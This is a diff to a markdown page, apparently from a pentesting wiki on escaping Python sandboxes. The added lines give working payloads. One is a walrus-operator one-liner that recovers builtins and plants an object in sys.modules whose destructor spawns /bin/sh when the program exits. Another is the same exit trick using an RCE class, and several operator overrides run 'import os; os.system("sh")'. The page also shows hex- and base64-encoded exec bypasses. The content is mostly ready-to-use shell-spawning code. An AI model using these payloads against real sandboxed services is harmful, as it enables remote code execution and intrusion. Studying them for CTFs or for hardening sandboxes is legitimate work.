@@ -109,6 +109,10 @@ This package is called `Reverse`.However, it was specially crafted so when you e
 
 ## Eval-ing python code
 
+{% hint style="warning" %}
+Note that exec allows multiline strings and ";", but eval doesn't (check walrus operator)
+{% endhint %}
+
 This is really interesting if some characters are forbidden because you can use the **hex/octal/B64** representation to **bypass** the restriction:
 
 ```python
@@ -130,6 +134,17 @@ exec("\x5f\x5f\x69\x6d\xIf youca70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x
 #Base64
 exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
+```
+
+## Operators and short tricks
+
+```python
+# walrus operator allows to generate variable inside a list
+## everything will be executed in order
+## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
+[a:=21,a*2]
+[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
+## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
 
 ## Python execution without calls
@@ -180,12 +195,17 @@ class RCE:
     __getitem__ = exec #Trigerred with obj[<argument>]
     __add__ = exec #Triggered with obj + <argument>
 
+# These lines abuse directly the previous class to get RCE
 rce = RCE() #Later we will see how to create objects without calling the constructor
 rce["print('Hello from __getitem__')"]
 rce + "print('Hello from __add__')"
 del rce
 
-# Other
+# These lines will get RCE when the program is over (exit)
+sys.modules["pwnd"] = RCE()
+exit()
+
+# Other functions to overwrite
 __sub__ (k - 'import os; os.system("sh")')
 __mul__ (k * 'import os; os.system("sh")')
 __floordiv__ (k // 'import os; os.system("sh")')
